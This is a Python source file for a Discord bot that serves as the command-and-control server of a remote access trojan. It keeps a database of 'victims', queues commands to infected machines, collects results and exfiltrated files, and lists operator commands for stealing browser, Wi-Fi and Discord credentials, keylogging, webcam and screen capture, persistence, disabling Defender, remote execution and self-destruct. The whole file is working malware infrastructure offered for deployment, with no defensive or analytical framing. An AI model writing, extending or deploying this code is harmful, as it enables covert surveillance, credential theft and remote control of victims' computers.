# discord_bot.py - Deploy on Railway
import discord
from discord.ext import commands
import os
import sqlite3
import asyncio
import json
from datetime import datetime

TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
PREFIX = "!"
GUILD_ID = int(os.environ.get("GUILD_ID", 0))

# Database setup
db = sqlite3.connect("rat_data.db")
c = db.cursor()

# Victims table
c.execute('''CREATE TABLE IF NOT EXISTS victims (
    victim_id TEXT PRIMARY KEY,
    hostname TEXT,
    username TEXT,
    os_info TEXT,
    ip TEXT,
    channel_id TEXT,
    status TEXT,
    first_seen DATETIME,
    last_seen DATETIME
)''')

# Commands log table
c.execute('''CREATE TABLE IF NOT EXISTS commands_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    command TEXT,
    result TEXT,
    timestamp DATETIME
)''')

# EXE execution log table
c.execute('''CREATE TABLE IF NOT EXISTS exe_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    exe_path TEXT,
    exe_name TEXT,
    timestamp DATETIME
)''')

# Files table
c.execute('''CREATE TABLE IF NOT EXISTS files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    filename TEXT,
    data BLOB,
    timestamp DATETIME
)''')

# Pending commands table
c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    victim_id TEXT,
    command TEXT,
    timestamp DATETIME
)''')

db.commit()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

def log_command(victim_id, command, result):
    c.execute("INSERT INTO commands_log (victim_id, command, result, timestamp) VALUES (?, ?, ?, ?)",
              (victim_id, command, result[:3000], datetime.now()))
    db.commit()

def log_exe_execution(victim_id, exe_path, exe_name):
    c.execute("INSERT INTO exe_log (victim_id, exe_path, exe_name, timestamp) VALUES (?, ?, ?, ?)",
              (victim_id, exe_path, exe_name, datetime.now()))
    db.commit()

def save_file(victim_id, filename, data):
    c.execute("INSERT INTO files (victim_id, filename, data, timestamp) VALUES (?, ?, ?, ?)",
              (victim_id, filename, data, datetime.now()))
    db.commit()
    return c.lastrowid

def get_active_victim(channel_id):
    c.execute("SELECT victim_id FROM victims WHERE channel_id=?", (str(channel_id),))
    row = c.fetchone()
    return row[0] if row else None

async def send_to_victim(ctx, command):
    victim_id = get_active_victim(str(ctx.channel.id))
    if not victim_id:
        await ctx.send("No active victim. Use `!switch <victim_id>`")
        return False
    c.execute("INSERT INTO pending_commands (victim_id, command, timestamp) VALUES (?, ?, ?)",
              (victim_id, command, datetime.now()))
    db.commit()
    await ctx.send(f"📡 Sent: `{command}`")
    return True

@bot.event
async def on_ready():
    print(f"✅ Bot online: {bot.user}")
    await bot.change_presence(activity=discord.Game(name="!help | 40+ commands"))

@bot.event
async def on_private_message(message):
    if message.author == bot.user:
        return
    
    victim_id = str(message.author.id)
    content = message.content
    
    if content.startswith("REG:"):
        try:
            info = json.loads(content[4:])
            channel = await message.author.create_dm()
            c.execute("INSERT OR REPLACE INTO victims VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                      (victim_id, info.get('hostname'), info.get('username'), info.get('os'),
                       info.get('ip'), str(channel.id), "online", datetime.now(), datetime.now()))
            db.commit()
            await message.channel.send("REG_OK")
            print(f"✅ New victim: {info.get('hostname')} | {victim_id}")
        except Exception as e:
            print(f"REG error: {e}")
            await message.channel.send("REG_FAIL")
    
    elif content.startswith("RESULT:"):
        parts = content.split(":", 2)
        if len(parts) == 3:
            _, command, result = parts
            log_command(victim_id, command, result)
            # Forward to channel
            c.execute("SELECT channel_id FROM victims WHERE victim_id=?", (victim_id,))
            row = c.fetchone()
            if row and row[0]:
                channel = bot.get_channel(int(row[0]))
                if channel:
                    await channel.send(f"📥 Result for `{command}`:\n```{result[:1500]}```")
            await message.channel.send("OK")
    
    elif content.startswith("EXE_LOG:"):
        # Format: EXE_LOG:C:\path\to\file.exe|filename.exe
        parts = content.split(":", 2)
        if len(parts) == 3:
            exe_data = parts[2]
            exe_path, exe_name = exe_data.split("|", 1)
            log_exe_execution(victim_id, exe_path, exe_name)
            await message.channel.send("EXE_OK")
    
    elif content.startswith("FILE:"):
        parts = content.split(":", 2)
        if len(parts) == 3:
            _, filename, b64data = parts
            import base64
            data = base64.b64decode(b64data)
            file_id = save_file(victim_id, filename, data)
            c.execute("SELECT channel_id FROM victims WHERE victim_id=?", (victim_id,))
            row = c.fetchone()
            if row and row[0]:
                channel = bot.get_channel(int(row[0]))
                if channel:
                    await channel.send(f"📎 File received: {filename}", file=discord.File(data, filename=filename))
            await message.channel.send(f"FILE_OK:{file_id}")
    
    elif content == "GET_CMD":
        c.execute("SELECT id, command FROM pending_commands WHERE victim_id=? ORDER BY timestamp ASC LIMIT 1", (victim_id,))
        row = c.fetchone()
        if row:
            cmd_id, command = row
            await message.channel.send(f"CMD:{command}")
            c.execute("DELETE FROM pending_commands WHERE id=?", (cmd_id,))
            db.commit()
        else:
            await message.channel.send("CMD:NONE")
    
    elif content == "PONG":
        c.execute("UPDATE victims SET last_seen=?, status='online' WHERE victim_id=?", (datetime.now(), victim_id))
        db.commit()

@bot.command(name="help")
async def help_cmd(ctx):
    help_text = """
**🤖 COMPLETE RAT C2 - 40+ COMMANDS**

**📡 SYSTEM**
`!sysinfo` `!clipboard` `!geolocation` `!av_list`
`!process_list` `!kill <PID>` `!exec <cmd>`

**🔑 PASSWORDS**
`!chrome_pass` `!firefox_pass` `!discord_token` `!wifi_pass` `!all_pass`

**📸 SURVEILLANCE**
`!screenshot` `!webcam` `!keylog` `!keylogstop`

**📁 FILES**
`!ls <path>` `!cd <path>` `!download <file>` `!upload <path> <b64>`
`!delete <file>` `!run <file>` `!zip <folder>`

**🛡️ PERSISTENCE**
`!persist` `!unpersist` `!hide` `!clone`

**💀 DESTRUCTIVE**
`!lock` `!shutdown` `!restart` `!logoff` `!blocksites` `!disdef` `!selfdestruct`

**💬 MESSAGING**
`!msgbox <text>` `!speak <text>` `!beep` `!openurl <url>`

**📋 MANAGEMENT**
`!list` `!switch <id>` `!results` `!files` `!getfile <id>` `!exe_logs <id>`
"""
    await ctx.send(help_text)

@bot.command(name="list")
async def list_victims(ctx):
    c.execute("SELECT victim_id, hostname, username, ip, status FROM victims ORDER BY last_seen DESC")
    victims = c.fetchall()
    if not victims:
        await ctx.send("No victims connected.")
        return
    msg = "**📡 Victims:**\n"
    for v_id, host, user, ip, status in victims:
        emoji = "🟢" if status == "online" else "🔴"
        msg += f"{emoji} `{v_id[:8]}...` | {host} | {user} | {ip}\n"
    await ctx.send(msg)

@bot.command(name="switch")
async def switch_victim(ctx, victim_id: str):
    c.execute("SELECT victim_id FROM victims WHERE victim_id LIKE ?", (f"{victim_id}%",))
    row = c.fetchone()
    if not row:
        await ctx.send("Victim not found")
        return
    full_id = row[0]
    c.execute("UPDATE victims SET channel_id=? WHERE victim_id=?", (str(ctx.channel.id), full_id))
    db.commit()
    await ctx.send(f"✅ Switched to `{full_id[:8]}...`")

@bot.command(name="results")
async def view_results(ctx, limit: int = 10):
    victim_id = get_active_victim(str(ctx.channel.id))
    if not victim_id:
        await ctx.send("No active victim. Use `!switch` first.")
        return
    c.execute("SELECT command, result, timestamp FROM commands_log WHERE victim_id=? ORDER BY timestamp DESC LIMIT ?", (victim_id, limit))
    rows = c.fetchall()
    if not rows:
        await ctx.send("No results yet.")
        return
    msg = f"**📋 Last {len(rows)} results:**\n"
    for cmd, res, ts in rows:
        msg += f"`{ts}` | {cmd}\n```{res[:200]}```\n"
        if len(msg) > 1800:
            await ctx.send(msg)
            msg = ""
    if msg:
        await ctx.send(msg)

@bot.command(name="files")
async def list_files_cmd(ctx):
    victim_id = get_active_victim(str(ctx.channel.id))
    if not victim_id:
        await ctx.send("No active victim.")
        return
    c.execute("SELECT id, filename, timestamp FROM files WHERE victim_id=? ORDER BY timestamp DESC LIMIT 20", (victim_id,))
    rows = c.fetchall()
    if not rows:
        await ctx.send("No files captured.")
        return
    msg = "**📁 Files:**\n"
    for fid, fname, ts in rows:
        msg += f"`{fid}` | {fname} | {ts}\n"
    await ctx.send(msg)

@bot.command(name="getfile")
async def get_file_cmd(ctx, file_id: int):
    victim_id = get_active_victim(str(ctx.channel.id))
    if not victim_id:
        await ctx.send("No active victim.")
        return
    c.execute("SELECT filename, data FROM files WHERE id=? AND victim_id=?", (file_id, victim_id))
    row = c.fetchone()
    if not row:
        await ctx.send("File not found")
        return
    filename, data = row
    await ctx.send(f"📎 {filename}", file=discord.File(data, filename=filename))

@bot.command(name="exe_logs")
async def view_exe_logs(ctx, victim_id: str = None):
    if not victim_id:
        victim_id = get_active_victim(str(ctx.channel.id))
    if not victim_id:
        await ctx.send("No victim specified. Use `!exe_logs <victim_id>` or `!switch` first.")
        return
    c.execute("SELECT exe_path, exe_name, timestamp FROM exe_log WHERE victim_id=? ORDER BY timestamp DESC LIMIT 20", (victim_id,))
    rows = c.fetchall()
    if not rows:
        await ctx.send(f"No EXE executions logged for this victim.")
        return
    msg = f"**📋 EXE Execution Logs:**\n"
    for path, name, ts in rows:
        msg += f"`{ts}` | {name} | `{path}`\n"
    await ctx.send(msg[:1900])

# Command wrappers
@bot.command(name="sysinfo")
async def cmd_sysinfo(ctx): await send_to_victim(ctx, "sysinfo")
@bot.command(name="screenshot")
async def cmd_screenshot(ctx): await send_to_victim(ctx, "screenshot")
@bot.command(name="webcam")
async def cmd_webcam(ctx): await send_to_victim(ctx, "webcam")
@bot.command(name="chrome_pass")
async def cmd_chrome(ctx): await send_to_victim(ctx, "chrome_pass")
@bot.command(name="discord_token")
async def cmd_discord(ctx): await send_to_victim(ctx, "discord_token")
@bot.command(name="keylog")
async def cmd_keylog(ctx): await send_to_victim(ctx, "keylog_start")
@bot.command(name="keylogstop")
async def cmd_keylogstop(ctx): await send_to_victim(ctx, "keylog_stop")
@bot.command(name="ls")
async def cmd_ls(ctx, path: str = "."): await send_to_victim(ctx, f"ls {path}")
@bot.command(name="cd")
async def cmd_cd(ctx, path: str): await send_to_victim(ctx, f"cd {path}")
@bot.command(name="download")
async def cmd_download(ctx, filepath: str): await send_to_victim(ctx, f"download {filepath}")
@bot.command(name="delete")
async def cmd_delete(ctx, filepath: str): await send_to_victim(ctx, f"delete {filepath}")
@bot.command(name="run")
async def cmd_run(ctx, filepath: str): await send_to_victim(ctx, f"run {filepath}")
@bot.command(name="exec")
async def cmd_exec(ctx, *, command: str): await send_to_victim(ctx, f"exec {command}")
@bot.command(name="lock")
async def cmd_lock(ctx): await send_to_victim(ctx, "lock")
@bot.command(name="shutdown")
async def cmd_shutdown(ctx): await send_to_victim(ctx, "shutdown")
@bot.command(name="restart")
async def cmd_restart(ctx): await send_to_victim(ctx, "restart")
@bot.command(name="selfdestruct")
async def cmd_selfdestruct(ctx): await send_to_victim(ctx, "selfdestruct")
@bot.command(name="msgbox")
async def cmd_msgbox(ctx, *, text: str): await send_to_victim(ctx, f"msgbox {text}")
@bot.command(name="speak")
async def cmd_speak(ctx, *, text: str): await send_to_victim(ctx, f"speak {text}")
@bot.command(name="beep")
async def cmd_beep(ctx): await send_to_victim(ctx, "beep")
@bot.command(name="openurl")
async def cmd_openurl(ctx, url: str): await send_to_victim(ctx, f"openurl {url}")
@bot.command(name="persist")
async def cmd_persist(ctx): await send_to_victim(ctx, "persist")
@bot.command(name="unpersist")
async def cmd_unpersist(ctx): await send_to_victim(ctx, "unpersist")
@bot.command(name="hide")
async def cmd_hide(ctx): await send_to_victim(ctx, "hide")
@bot.command(name="clone")
async def cmd_clone(ctx): await send_to_victim(ctx, "clone")
@bot.command(name="blocksites")
async def cmd_blocksites(ctx): await send_to_victim(ctx, "blocksites")
@bot.command(name="disdef")
async def cmd_disdef(ctx): await send_to_victim(ctx, "disdef")
@bot.command(name="logoff")
async def cmd_logoff(ctx): await send_to_victim(ctx, "logoff")
@bot.command(name="all_pass")
async def cmd_allpass(ctx): await send_to_victim(ctx, "all_pass")
@bot.command(name="wifi_pass")
async def cmd_wifi(ctx): await send_to_victim(ctx, "wifi_pass")
@bot.command(name="firefox_pass")
async def cmd_firefox(ctx): await send_to_victim(ctx, "firefox_pass")
@bot.command(name="clipboard")
async def cmd_clipboard(ctx): await send_to_victim(ctx, "clipboard")
@bot.command(name="geolocation")
async def cmd_geolocation(ctx): await send_to_victim(ctx, "geolocation")
@bot.command(name="av_list")
async def cmd_avlist(ctx): await send_to_victim(ctx, "av_list")
@bot.command(name="process_list")
async def cmd_processlist(ctx): await send_to_victim(ctx, "process_list")
@bot.command(name="kill")
async def cmd_kill(ctx, pid: int): await send_to_victim(ctx, f"kill {pid}")
@bot.command(name="zip")
async def cmd_zip(ctx, folder: str): await send_to_victim(ctx, f"zip {folder}")

bot.run(TOKEN)
